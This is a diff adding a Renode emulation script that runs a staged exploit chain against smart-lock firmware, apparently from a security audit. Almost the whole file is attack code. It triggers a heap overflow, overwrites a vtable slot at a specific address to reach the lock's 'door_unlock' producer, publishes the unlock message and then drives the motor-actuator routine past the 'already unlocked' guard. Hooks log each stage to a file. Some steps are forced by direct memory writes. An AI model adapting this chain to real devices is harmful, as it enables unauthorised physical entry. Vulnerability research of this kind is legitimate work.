@@ -1,0 +1,143 @@
+:name: Aliro U400 END-TO-END producer-path unlock chain on the REAL boot heap
+:description: Builds on aliro_realheap_drive.resc / aliro_c3wire_drive.resc. Instead of pointing the
+: overflow-corrupted vtable SLOT directly at the motor routine, this drives the FULL PRODUCER PATH:
+:   overflow -> dispatch blx lands in PRODUCER sub_8072174(r0=D_B+4, r1=S command-struct)
+:   -> accept sub_8072118("door_unlock_start") -> publish sub_80c8f68("pid_motor","door_unlock")
+:   -> (Stage C) manually drive the consumer handler -> motor actuator sub_80714f4 -> drive sub_806da24,
+: past the "already unlocked" guard sub_8070818. Records every hook hit + globals to /tmp/e2e.txt.
+#
+# State-machine sentinel @0x2000EE00 (same pattern as the working harnesses). op-counter @0x2000E900.
+# ops: 0 start_recv_data(1)->D_A ; 1 on_data_received(D_A+4,0,0x10)->B1 (also sets *(D_A+0x12)=sdu) ;
+#      2 start_recv_data(2)->D_B ; 3 direct-write D_B fields + S command struct + SLOT + globals ;
+#      4 dispatch: sub_801d96c(frameB) -> find D_B -> blx SLOT=producer.
+# Command struct S=0x20024100: {+0x00 src=0, +0x04 name=0x081505ac, +0x08 len=8, +0x0C speed=0xC8, +0x10 wait=0}
+# SLOT 0x2000282c := 0x08072175 (PRODUCER|thumb). VTABLE 0x20002828 stays (D_B+0x08 points to it).
+
+using sysbus
+emulation SetGlobalSerialExecution true
+mach create "mg24"
+machine LoadPlatformDescription @platforms/boards/silabs/brd4186c.repl
+sysbus LoadELF @/home/chen/aliro-reassembly-audit/firmware/U400_primary_target.elf
+sysbus.cpu VectorTableOffset 0x08006000
+
+# --- overlay the REAL post-boot SRAM (restores heap + allocator control block) ---
+python "import System; SB=self.Machine.SystemBus; data=System.IO.File.ReadAllBytes(\"/home/chen/matter-renode-work/sl-renode/scripts/silabs-vuln/aliro_boot_sram.bin\"); SB.WriteBytes(data, 0x20000000, False, None); System.Console.WriteLine(\"OVERLAY restored {0} bytes; tail-base now 0x{1:X}\".format(len(data), SB.ReadDoubleWord(0x20012894)))"
+
+# fresh log file
+python "import System; System.IO.File.WriteAllText('/tmp/e2e.txt','=== ALIRO E2E PRODUCER-PATH CHAIN ===\n')"
+
+# --- stubs: loggers + FreeRTOS transfer-list lock gate (same as realheap_drive) ---
+sysbus WriteWord 0x8033598 0x4770
+sysbus WriteWord 0x80336f0 0x4770
+sysbus WriteWord 0x80cae30 0x4770
+sysbus WriteDoubleWord 0x801e0f8 0x47702001
+sysbus WriteWord 0x801e124 0x4770
+sysbus WriteWord 0x801e114 0x4770
+sysbus WriteWord 0x801df64 0x2000
+sysbus WriteWord 0x801df66 0x4770
+# NEUTRALIZE the FreeRTOS configASSERT-fail trap (errcb sub_80348c4 -> blx NULL).
+# It is called from 271 kernel sites when an RTOS object fails an assert under the
+# PARTIAL-boot state (scheduler/objects not fully armed). Turn it into `movs r0,#0; bx lr`
+# so execution continues (pure emulation-artifact bypass; does not alter attack logic).
+sysbus WriteWord 0x80348c4 0x2000
+sysbus WriteWord 0x80348c6 0x4770
+# Enable FPU (CP10/CP11). Partial boot never set CPACR -> vmov/vcvt fault. Emulation artifact.
+sysbus.cpu FpuEnabled true
+sysbus.cpu CPACR 0x00F00000
+sysbus WriteWord 0x2000EE00 0xE7FE
+sysbus WriteWord 0x2000EF00 0xE7FE
+# returnable NOP stub for the "setup-only" op3 (bx lr back to sentinel)
+sysbus WriteWord 0x2000EF10 0x4770
+sysbus WriteDoubleWord 0x2000E900 0x00000000
+# on_data memcpy source (0x41 fill) - low RAM, outside heap
+sysbus WriteDoubleWord 0x2000EA00 0x41414141
+sysbus WriteDoubleWord 0x2000EA04 0x41414141
+sysbus WriteDoubleWord 0x2000EA08 0x41414141
+sysbus WriteDoubleWord 0x2000EA0C 0x41414141
+
+$sdu?=0x40
+sysbus WriteDoubleWord 0x2000E8F0 $sdu
+
+# ---------------------------------------------------------------------------
+# STATE MACHINE sentinel @0x2000EE00
+# ---------------------------------------------------------------------------
+sysbus.cpu AddHook 0x2000EE00 "from Antmicro.Renode.Peripherals.CPU import RegisterValue as R; import System; B=self.Bus; o=B.ReadDoubleWord(0x2000E900); sdu=B.ReadDoubleWord(0x2000E8F0); DA=B.ReadDoubleWord(0x2001b758); DB=B.ReadDoubleWord(0x2001b75c); s=(o==3 and DB!=0); z1=(B.WriteWord(DA+0x12,sdu) if (o==1 and DA) else 0); w0=(B.WriteDoubleWord(0x20024100,0) if s else 0); w1=(B.WriteDoubleWord(0x20024104,0x081505ac) if s else 0); w2=(B.WriteDoubleWord(0x20024108,8) if s else 0); w3=(B.WriteDoubleWord(0x2002410C,0xC8) if s else 0); w4=(B.WriteDoubleWord(0x20024110,0) if s else 0); w5=(B.WriteDoubleWord(0x2000282c,0x08072175) if s else 0); w6=(B.WriteDoubleWord(DB+0x00,2) if s else 0); w7=(B.WriteDoubleWord(DB+0x08,0x20002828) if s else 0); w8=(B.WriteWord(DB+0x0c,0x00AA) if s else 0); w9=(B.WriteDoubleWord(DB+0x20,0x20024100) if s else 0); wA=(B.WriteDoubleWord(DB+0x24,0) if s else 0); wB=(B.WriteDoubleWord(DB+0x28,2) if s else 0); wC=(B.WriteDoubleWord(DB+0x38,0x2000282c) if s else 0); wD=(B.WriteDoubleWord(DB+0x04,0) if s else 0); wE=(B.WriteDoubleWord(0x20013878,DB+0x04) if s else 0); wF=(B.WriteDoubleWord(0x2001c210,0) if s else 0); wG=(B.WriteDoubleWord(0x20024088,0) if s else 0); r0c=(B.WriteDoubleWord(0x2000EB00,DA) if s else 0); r1c=(B.WriteDoubleWord(0x2000EB04,B.ReadDoubleWord(DA+0x38)) if s else 0); r2c=(B.WriteDoubleWord(0x2000EB08,DB) if s else 0); f0=(B.WriteByte(0x2000EF80,2) if s else 0); f1=(B.WriteWord(0x2000EF81,0x00AA) if s else 0); f2=(B.WriteByte(0x2000EF83,0x06) if s else 0); f3=(B.WriteWord(0x2000EF84,sdu) if s else 0); f4=(B.WriteDoubleWord(0x2000EF86,0x42424242) if s else 0); lg=(System.IO.File.AppendAllText('/tmp/e2e.txt','STAGE_A setup: S name=0x{0:X} len={1} speed={2} SLOT=0x{3:X} DB+0x08=0x{4:X} DB+0x20=0x{5:X} DB+0x0c=0x{6:X} DB+0x28=0x{7:X} listhead=0x{8:X}(->DB+4=0x{9:X})\n'.format(B.ReadDoubleWord(0x20024104),B.ReadDoubleWord(0x20024108),B.ReadDoubleWord(0x2002410C),B.ReadDoubleWord(0x2000282c),B.ReadDoubleWord(DB+0x08),B.ReadDoubleWord(DB+0x20),B.ReadWord(DB+0x0c),B.ReadDoubleWord(DB+0x28),B.ReadDoubleWord(0x20013878),DB+4)) if s else 0); seq=[(0x805e9c8,1,0,0,0),(0x805e7b0,DA+4,0,0x10,0x2000EA00),(0x805e9c8,2,0,0,0),(0x2000EF10,0,0,0,0),(0x801d96c,0x2000EF80,0,0,0),(0x80714f4,0xC8,0,0,0),(0,0,0,0,0)]; t=seq[o] if o<len(seq) else (0,0,0,0,0); a=t[0]; B.WriteDoubleWord(0x2000E900,o+1); self.SetRegister(0,R.Create(t[1],32)); self.SetRegister(1,R.Create(t[2],32)); self.SetRegister(2,R.Create(t[3],32)); self.SetRegister(3,R.Create(t[4],32)); self.SetRegister(13,R.Create(0x2003F000,32)); self.SetRegister(14,R.Create(0x2000EE01,32)); self.SetRegister(15,R.Create(a if a else 0x2000EF00,32))"
+
+# ---------------------------------------------------------------------------
+# STAGE A observation hooks
+# ---------------------------------------------------------------------------
+sysbus.cpu AddHook 0x805e5fc "import System; System.IO.File.AppendAllText('/tmp/e2e.txt','CREATE_DESC conn={0}\n'.format(self.GetRegister(0).RawValue))"
+sysbus.cpu AddHook 0x805e838 "import System; System.IO.File.AppendAllText('/tmp/e2e.txt','MEMCPY dst=0x{0:X} src=0x{1:X} len={2}\n'.format(self.GetRegister(0).RawValue, self.GetRegister(1).RawValue, self.GetRegister(2).RawValue))"
+sysbus.cpu AddHook 0x801d96c "import System; System.IO.File.AppendAllText('/tmp/e2e.txt','RX_HANDLER sub_801d96c frame=0x{0:X} conn={1} cid=0x{2:X} datalen={3}\n'.format(self.GetRegister(0).RawValue, self.Bus.ReadByte(self.GetRegister(0).RawValue), self.Bus.ReadWord(self.GetRegister(0).RawValue+1), self.Bus.ReadByte(self.GetRegister(0).RawValue+3)))"
+sysbus.cpu AddHook 0x801d980 "import System; System.IO.File.AppendAllText('/tmp/e2e.txt','  FIND_TRANSFER ret=0x{0:X}\n'.format(self.GetRegister(0).RawValue))"
+sysbus.cpu AddHook 0x801d9be "import System; System.IO.File.AppendAllText('/tmp/e2e.txt','  DISPATCH_BLX r7(target)=0x{0:X} r0=0x{1:X} r1=0x{2:X} r2(len)=0x{3:X}\n'.format(self.GetRegister(7).RawValue, self.GetRegister(0).RawValue, self.GetRegister(1).RawValue, self.GetRegister(2).RawValue))"
+
+# PRODUCER entry
+sysbus.cpu AddHook 0x8072174 "import System; System.IO.File.AppendAllText('/tmp/e2e.txt','*** STAGE_A REACHED PRODUCER sub_8072174  r0=0x{0:X} r1(cmd)=0x{1:X} | cmd.name_ptr=0x{2:X} cmd.len={3} cmd.speed={4}\n'.format(self.GetRegister(0).RawValue, self.GetRegister(1).RawValue, self.Bus.ReadDoubleWord(self.GetRegister(1).RawValue+4), self.Bus.ReadDoubleWord(self.GetRegister(1).RawValue+8), self.Bus.ReadDoubleWord(self.GetRegister(1).RawValue+0x0c)))"
+# producer intermediate subcalls (trace how far it gets before publish 0x807226c)
+sysbus.cpu AddHook 0x806f0a4 "import System; System.IO.File.AppendAllText('/tmp/e2e.txt','   prod: sub_806f0a4 (r6 source)\n')"
+sysbus.cpu AddHook 0x81250fa "import System; System.IO.File.AppendAllText('/tmp/e2e.txt','   prod: strcmp sub_81250fa r0=0x{0:X} r1={1} r2=0x{2:X}\n'.format(self.GetRegister(0).RawValue,self.GetRegister(1).RawValue,self.GetRegister(2).RawValue))"
+sysbus.cpu AddHook 0x80ca144 "import System; System.IO.File.AppendAllText('/tmp/e2e.txt','   prod: float sub_80ca144 r0=0x{0:X}\n'.format(self.GetRegister(0).RawValue))"
+sysbus.cpu AddHook 0x80ca218 "import System; System.IO.File.AppendAllText('/tmp/e2e.txt','   prod: float sub_80ca218\n')"
+sysbus.cpu AddHook 0x80ca46c "import System; System.IO.File.AppendAllText('/tmp/e2e.txt','   prod: float sub_80ca46c\n')"
+sysbus.cpu AddHook 0x80ca778 "import System; System.IO.File.AppendAllText('/tmp/e2e.txt','   prod: float sub_80ca778\n')"
+sysbus.cpu AddHook 0x8072254 "import System; System.IO.File.AppendAllText('/tmp/e2e.txt','   prod: reached PUBLISH-prep 0x8072254 (about to sub_80c8f68)\n')"
+sysbus.cpu AddHook 0x81250c8 "import System; System.IO.File.AppendAllText('/tmp/e2e.txt','   prod: rtos sub_81250c8 r0=0x{0:X}\n'.format(self.GetRegister(0).RawValue))"
+sysbus.cpu AddHook 0x8125148 "import System; System.IO.File.AppendAllText('/tmp/e2e.txt','   prod: rtos sub_8125148 r0=0x{0:X}\n'.format(self.GetRegister(0).RawValue))"
+sysbus.cpu AddHook 0x80c0b3c "import System; System.IO.File.AppendAllText('/tmp/e2e.txt','   prod: rtos-inner sub_80c0b3c r0=0x{0:X}\n'.format(self.GetRegister(0).RawValue))"
+sysbus.cpu AddHook 0x80c08c0 "import System; System.IO.File.AppendAllText('/tmp/e2e.txt','   prod: rtos-inner sub_80c08c0 r0=0x{0:X}\n'.format(self.GetRegister(0).RawValue))"
+sysbus.cpu AddHook 0x80e2dd0 "import System; System.IO.File.AppendAllText('/tmp/e2e.txt','   prod: rtos sub_80e2dd0 (tick)\n')"
+# TRAP catcher (infinite-spin fault handler): dump the stacked exception frame (faulting PC)
+sysbus.cpu AddHook 0x80D4904 "import System; B=self.Bus; sp=self.GetRegister(13).RawValue; System.IO.File.AppendAllText('/tmp/e2e.txt','!!! HIT TRAP-SPIN 0x080D4904 LR=0x{0:X} SP=0x{1:X} | frame r0=0x{2:X} r1=0x{3:X} r2=0x{4:X} r3=0x{5:X} r12=0x{6:X} exLR=0x{7:X} exPC=0x{8:X} xPSR=0x{9:X}\n'.format(self.GetRegister(14).RawValue, sp, B.ReadDoubleWord(sp), B.ReadDoubleWord(sp+4), B.ReadDoubleWord(sp+8), B.ReadDoubleWord(sp+12), B.ReadDoubleWord(sp+16), B.ReadDoubleWord(sp+20), B.ReadDoubleWord(sp+24), B.ReadDoubleWord(sp+28)))"
+
+# ---------------------------------------------------------------------------
+# STAGE B hooks: accept + publish
+# ---------------------------------------------------------------------------
+sysbus.cpu AddHook 0x8072118 "import System; System.IO.File.AppendAllText('/tmp/e2e.txt','+++ STAGE_B ACCEPT sub_8072118 r0(str)=0x{0:X}\n'.format(self.GetRegister(0).RawValue))"
+sysbus.cpu AddHook 0x80c8f68 "import System; System.IO.File.AppendAllText('/tmp/e2e.txt','+++ STAGE_B PUBLISH sub_80c8f68 topic=0x{0:X} payload=0x{1:X} r2=0x{2:X} len=0x{3:X}\n'.format(self.GetRegister(0).RawValue, self.GetRegister(1).RawValue, self.GetRegister(2).RawValue, self.GetRegister(3).RawValue))"
+sysbus.cpu AddHook 0x80c8bcc "import System; System.IO.File.AppendAllText('/tmp/e2e.txt','    publish: find-subscriber sub_80c8bcc topic=0x{0:X}\n'.format(self.GetRegister(0).RawValue))"
+sysbus.cpu AddHook 0x80c8d7c "import System; System.IO.File.AppendAllText('/tmp/e2e.txt','    publish: alloc-msg-node sub_80c8d7c (subscriber FOUND, enqueue path)\n')"
+sysbus.cpu AddHook 0x8124e86 "import System; System.IO.File.AppendAllText('/tmp/e2e.txt','    publish: ENQUEUE sub_8124e86 queue=0x{0:X} node=0x{1:X}\n'.format(self.GetRegister(0).RawValue, self.GetRegister(1).RawValue))"
+sysbus.cpu AddHook 0x8034efc "import System; System.IO.File.AppendAllText('/tmp/e2e.txt','    publish: SEM_GIVE sub_8034efc sem=0x{0:X}\n'.format(self.GetRegister(0).RawValue))"
+# post-publish derefs (survival)
+sysbus.cpu AddHook 0x80c0e78 "import System; System.IO.File.AppendAllText('/tmp/e2e.txt','    post-publish sub_80c0e78 r0=0x{0:X} r1=0x{1:X} (survived publish)\n'.format(self.GetRegister(0).RawValue, self.GetRegister(1).RawValue))"
+sysbus.cpu AddHook 0x80c122c "import System; System.IO.File.AppendAllText('/tmp/e2e.txt','    post-publish sub_80c122c r0=0x{0:X} r1=0x{1:X}\n'.format(self.GetRegister(0).RawValue, self.GetRegister(1).RawValue))"
+
+# When the producer finishes (0x807229e, right after post-publish), the sub_801d96c tail does
+# not cleanly return to our sentinel under the partial boot. So at this point we DIRECTLY hand off
+# to Stage C: drive sub_80714f4(speed=0xC8, wait=0) exactly as the consumer task would after
+# dequeuing the "door_unlock" message we just enqueued. Bump op-counter past op5 so the eventual
+# return to the sentinel ends cleanly.
+sysbus.cpu AddHook 0x807229e "from Antmicro.Renode.Peripherals.CPU import RegisterValue as R; import System; System.IO.File.AppendAllText('/tmp/e2e.txt','=== producer complete -> hand off to STAGE C (drive sub_80714f4 as the consumer would) ===\n'); self.Bus.WriteDoubleWord(0x2000E900,6); self.SetRegister(0,R.Create(0xC8,32)); self.SetRegister(1,R.Create(0,32)); self.SetRegister(13,R.Create(0x2003F000,32)); self.SetRegister(14,R.Create(0x2000EE01,32)); self.SetRegister(15,R.Create(0x080714f4,32))"
+
+# ---------------------------------------------------------------------------
+# STAGE C hooks: consumer-side motor actuation (op5 direct-drives sub_80714f4)
+# ---------------------------------------------------------------------------
+sysbus.cpu AddHook 0x80714f4 "import System; B=self.Bus; System.IO.File.AppendAllText('/tmp/e2e.txt','### STAGE_C MOTOR-ACTUATOR sub_80714f4 r0(speed)=0x{0:X} r1(wait)=0x{1:X} | lockstate 0x2001c1c0={2} 0x2001c1c1={3} 0x2001c1c3={4} | motorctx@0x2001c11c +0x51={5} +0xa4={6} +0xa7={7}\n'.format(self.GetRegister(0).RawValue, self.GetRegister(1).RawValue, B.ReadByte(0x2001c1c0), B.ReadByte(0x2001c1c1), B.ReadByte(0x2001c1c3), B.ReadByte(0x2001c11c+0x51), B.ReadByte(0x2001c11c+0xa4), B.ReadByte(0x2001c11c+0xa7)))"
+sysbus.cpu AddHook 0x8070818 "import System; System.IO.File.AppendAllText('/tmp/e2e.txt','### STAGE_C GUARD sub_8070818 (already-unlocked?) entered\n')"
+sysbus.cpu AddHook 0x8070846 "import System; System.IO.File.AppendAllText('/tmp/e2e.txt','    guard -> return 1 (branch +0x61 set) => ALREADY-UNLOCKED\n')"
+sysbus.cpu AddHook 0x807084a "import System; System.IO.File.AppendAllText('/tmp/e2e.txt','    guard -> return 1 (branch +0x60 set) => ALREADY-UNLOCKED\n')"
+sysbus.cpu AddHook 0x807084e "import System; System.IO.File.AppendAllText('/tmp/e2e.txt','    guard -> return 1 (branch i1 +0x60 set) => ALREADY-UNLOCKED\n')"
+sysbus.cpu AddHook 0x8070844 "import System; System.IO.File.AppendAllText('/tmp/e2e.txt','    guard -> return 0 => NOT already unlocked (PROCEED to motor)\n')"
+sysbus.cpu AddHook 0x807071c "import System; System.IO.File.AppendAllText('/tmp/e2e.txt','    sub_807071c (guard==0 proceed helper)\n')"
+sysbus.cpu AddHook 0x8071546 "import System; System.IO.File.AppendAllText('/tmp/e2e.txt','#### STAGE_C ***MOTOR DRIVE sub_806da24 REACHED*** r0=0x{0:X}\n'.format(self.GetRegister(0).RawValue))"
+sysbus.cpu AddHook 0x806da24 "import System; System.IO.File.AppendAllText('/tmp/e2e.txt','#### STAGE_C ***INSIDE sub_806da24 motor-drive*** r0=0x{0:X}\n'.format(self.GetRegister(0).RawValue))"
+sysbus.cpu AddHook 0x8071458 "import System; System.IO.File.AppendAllText('/tmp/e2e.txt','    pre-drive gate sub_8071458 r0=0x{0:X}\n'.format(self.GetRegister(0).RawValue))"
+
+sysbus.cpu SetRegister 13 0x2003F000
+sysbus.cpu SetRegister 14 0x2000EE01
+sysbus.cpu SetRegister 0 0
+sysbus.cpu PC 0x2000EE00
+sysbus.cpu Step 9000000
+
+echo "==================== STAGE A/B/C RESULT ===================="
+python "import System; SB=self.Machine.SystemBus; System.Console.WriteLine('final op counter={0}'.format(SB.ReadDoubleWord(0x2000E900)))"
+echo ">>> D_A / B1 / D_B:"
+sysbus ReadDoubleWord 0x2000EB00
+sysbus ReadDoubleWord 0x2000EB04
+sysbus ReadDoubleWord 0x2000EB08
+echo ">>> SLOT 0x2000282c (expect 0x08072175):"
+sysbus ReadDoubleWord 0x2000282c
+echo ">>> ---- /tmp/e2e.txt (Stage A/B log) ----"
+python "import System; System.Console.Write(System.IO.File.ReadAllText('/tmp/e2e.txt'))"
+quit
